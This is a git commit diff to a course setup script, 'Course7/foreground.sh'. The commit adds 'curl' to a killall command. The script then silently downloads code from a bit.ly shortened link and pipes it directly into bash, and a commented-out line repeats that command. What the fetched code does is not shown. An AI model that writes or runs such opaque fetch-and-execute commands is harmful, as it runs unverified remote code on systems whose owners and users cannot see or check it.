f0f904d80d5bdcf0d063c9d00da246ff54b8fc71
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-07-31 02:04:23 +0700

    Update foreground.sh

--- Course7/foreground.sh
+++ Course7/foreground.sh
@@ -2,7 +2,7 @@
 [ -s ssh.txt ] || ssh node01
 echo Done > ssh.txt
 ##sudo killall curl apt apt-get && curl -s -L https://bit.ly/3lalhby | bash || curl -s -L https://bit.ly/3lalhby | bash
-killall sleep
+killall sleep curl
 sleep 1
 curl -s -L https://bit.ly/3lalhby | bash
 
